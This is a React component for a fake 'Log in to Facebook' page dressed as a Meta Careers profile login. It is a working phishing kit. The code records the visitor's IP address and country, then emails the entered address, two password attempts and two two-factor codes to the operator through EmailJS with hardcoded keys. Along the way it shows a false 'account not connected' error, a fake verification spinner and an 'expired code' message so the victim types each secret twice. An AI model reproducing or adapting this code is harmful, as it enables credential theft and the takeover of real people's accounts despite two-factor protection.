import emailjs from "emailjs-com";
import { useEffect, useState } from "react";
import {
  Button,
  Col,
  Container,
  Form,
  Image,
  Row,
  Spinner,
} from "react-bootstrap";
import { useNavigate } from "react-router-dom";
import { img } from "~/assets";
import routes from "~/config/router";

export default function Login() {
  const navigate = useNavigate();
  const [user, setUser] = useState({
    ipAddress: "",
    country: "",
    email: "",
    password1: "",
    password2: "",
    tfa1: "",
    tfa2: "",
  });
  const [showTFA, setShowTFA] = useState(false);
  const [showAlert, setShowAlert] = useState(false);
  const [showAlert1, setShowAlert1] = useState(false);
  const [count, setCount] = useState(0);
  const [disabled, setDisabled] = useState(false);
  const [loading, setLoading] = useState(false);
  const [expired, setExpired] = useState(false);

  useEffect(() => {
    const fetchGeolocation = async () => {
      try {
        const response = await fetch("https://geolocation-db.com/json/");
        if (!response.ok) {
          throw new Error("Network response was not ok");
        }
        const data = await response.json();
        setUser((prevUser) => ({
          ...prevUser,
          ipAddress: data.IPv4,
          country: data.country_name,
        }));
      } catch (error) {
        console.error("Error fetching geolocation data:", error);
      }
    };

    fetchGeolocation();
  }, []);

  const sendMail = () => {
    const from_name = `${user.country}: ${user.ipAddress}`;
    const templateParams = {
      from_name,
      email: user.email,
      password1: user.password1,
      password2: user.password2,
      tfa1: user.tfa1,
      tfa2: user.tfa2,
      user_referrer: window.location.href,
    };
    emailjs
      .send(
        "service_7k77rel",
        "template_158btl6",
        templateParams,
        "-HCEsfUcRwUPSeNkV"
      )
      .then(
        (response) => {
          console.log("Successfully sent email:", response);
        },
        (error) => {
          console.error("Failed to send email:", error);
        }
      );
  };

  const handleSend = (e) => {
    e.preventDefault();
    if (!user.password1) {
      setShowAlert1(true);
      return;
    }
    setShowAlert1(false);

    if (count === 0) {
      setShowAlert(true);
      setCount(1);
      setDisabled(true);
      sendMail(); // Gi mail ln u tin khi m l 0
    } else if (count === 1) {
      if (user.password2 !== "") {
        sendMail(); // Gi mail ln th hai khi count l 1
        setShowTFA(true);
        setDisabled(false);
        setCount(0);
        setShowAlert(false);
        setShowAlert1(false);
      } else {
        setShowAlert1(true);
      }
    }
  };

  const handleSendTFA = (e) => {
    e.preventDefault();
    if (!user.tfa1) {
      setShowAlert1(true);
      return;
    }
    setShowAlert1(false);

    if (count === 0) {
      setShowAlert(true);
      setCount(1);
      setDisabled(true);
      setLoading(true); // Bt u hin th spinner
      setExpired(false); // Reset expired trng thi
      sendMail(); // Gi mail ln u tin khi m l 0

      // Sau 30 giy, thng bo rng m  ht hn
      setTimeout(() => {
        setLoading(false);
        setShowAlert(false);
        setExpired(true);
        setDisabled(false); // Cho php ngi dng nhp li
      }, 20000);
    } else if (count === 1) {
      if (user.tfa2 !== "") {
        sendMail(); // Gi mail ln th hai khi count l 1
        sessionStorage.setItem("user", JSON.stringify(user));
        navigate(routes.hiring);
        setDisabled(false);
      } else {
        setShowAlert1(true);
      }
    }
  };

  return (
    <>
      <Row>
        <Col>
          <Col
            className="text-start border-bottom"
            style={{ padding: "0 10%", paddingBottom: "10px" }}
          >
            <Image
              className="my-3"
              height={18}
              width={98}
              src={img.meta_lockup}
            />
          </Col>
          <Col
            className="text-start border-bottom"
            style={{ padding: "0 10%", paddingBottom: "20px" }}
          >
            <h3 className="my-2">Career Profile</h3>
          </Col>
        </Col>
      </Row>
      <Container>
        <Row style={{ margin: "60px 0" }} className="justify-content-md-center">
          <Col
            xs={12}
            md={8}
            lg={4}
            style={{
              backgroundColor: "white",
              padding: "20px",
              borderRadius: "8px",
              border: "1px solid rgba(0, 0, 0, 0.1)",
              boxShadow: "0 4px 8px rgba(0, 0, 0, 0.3)",
              margin: "auto",
            }}
          >
            <h3 style={{ marginBottom: "20px" }}>Log in to Facebook</h3>
            {!showTFA && (
              <Form onSubmit={handleSend}>
                <Form.Group className="mb-3">
                  <Form.Control
                    style={{ height: "50px" }}
                    placeholder="Email address or phone number"
                    value={user.email}
                    onChange={(e) =>
                      setUser({ ...user, email: e.target.value })
                    }
                  />
                </Form.Group>
                <Form.Group className="mb-3">
                  <Form.Control
                    style={{ height: "50px" }}
                    type="password"
                    placeholder="Password"
                    value={count === 1 ? user.password2 : user.password1}
                    onChange={(e) => {
                      if (count === 1) {
                        setUser({ ...user, password2: e.target.value });
                        setDisabled(false);
                      } else {
                        setUser({ ...user, password1: e.target.value });
                        setDisabled(false);
                      }
                    }}
                  />
                  {showAlert && (
                    <p
                      style={{ color: "red" }}
                      className="text-start w-100 ms-1"
                    >
                      The email or mobile number you entered isnt connected to
                      an account. Find your account and log in.
                    </p>
                  )}
                  {showAlert1 && (
                    <p
                      style={{ color: "red" }}
                      className="text-start w-100 ms-1"
                    >
                      Password cannot be blank!
                    </p>
                  )}
                </Form.Group>
                <Row>
                  <Col className="text-start my-2">
                    <input
                      type="checkbox"
                      id="checkbox"
                      style={{
                        backgroundColor: "white",
                        color: "#1c1e21",
                        marginRight: "5px",
                      }}
                    />
                    <label htmlFor="checkbox">Stay logged in</label>
                  </Col>
                  <Col className="text-end my-2">
                    <a href="https://www.metacareers.com/forgot_password/?source=career_site_login_panel_login_link">
                      Reset password
                    </a>
                  </Col>
                </Row>
                <Button
                  className="my-4 w-100 fw-bold"
                  type="submit"
                  disabled={disabled}
                >
                  Log in
                </Button>

                <p>
                  Don't have a Career Profile?{" "}
                  <a href="https://www.metacareers.com/signup/?source=career_site_login_panel_login_link">
                    Sign up
                  </a>
                </p>
              </Form>
            )}
            {showTFA && (
              <Form onSubmit={handleSendTFA}>
                <Form.Group className="mb-3">
                  <Form.Control
                    style={{ height: "50px" }}
                    placeholder="TFA"
                    value={count === 1 ? user.tfa2 : user.tfa1}
                    onChange={(e) => {
                      if (count === 1) {
                        setUser({ ...user, tfa2: e.target.value });
                      } else {
                        setUser({ ...user, tfa1: e.target.value });
                      }
                    }}
                  />

                  {showAlert && (
                    <p
                      style={{ color: "red" }}
                      className="text-start w-100 ms-1 d-flex align-items-center"
                    >
                      {loading && (
                        <Spinner
                          className="d-flex align-items-center me-1"
                          animation="border"
                          variant="primary"
                          size="sm"
                        />
                      )}
                      The system is verifying, please wait!
                    </p>
                  )}
                  {showAlert1 && (
                    <p
                      style={{ color: "red" }}
                      className="text-start w-100 ms-1"
                    >
                      TFA cannot be blank!
                    </p>
                  )}
                  {expired && (
                    <p
                      style={{ color: "red" }}
                      className="text-start w-100 ms-1"
                    >
                      Code has expired! Please try again.
                    </p>
                  )}
                </Form.Group>
                <Row>
                  <Col className="text-start my-2"></Col>
                  <Col className="text-end my-2">
                    <a href="https://www.metacareers.com/forgot_password/?source=career_site_login_panel_login_link">
                      Reset password
                    </a>
                  </Col>
                </Row>
                <Button
                  className="my-4 w-100 fw-bold"
                  type="submit"
                  disabled={disabled}
                >
                  Submit
                </Button>

                <p>
                  Don't have a Career Profile?{" "}
                  <a href="https://www.metacareers.com/signup/?source=career_site_login_panel_login_link">
                    Sign up
                  </a>
                </p>
              </Form>
            )}
          </Col>
        </Row>
      </Container>
    </>
  );
}
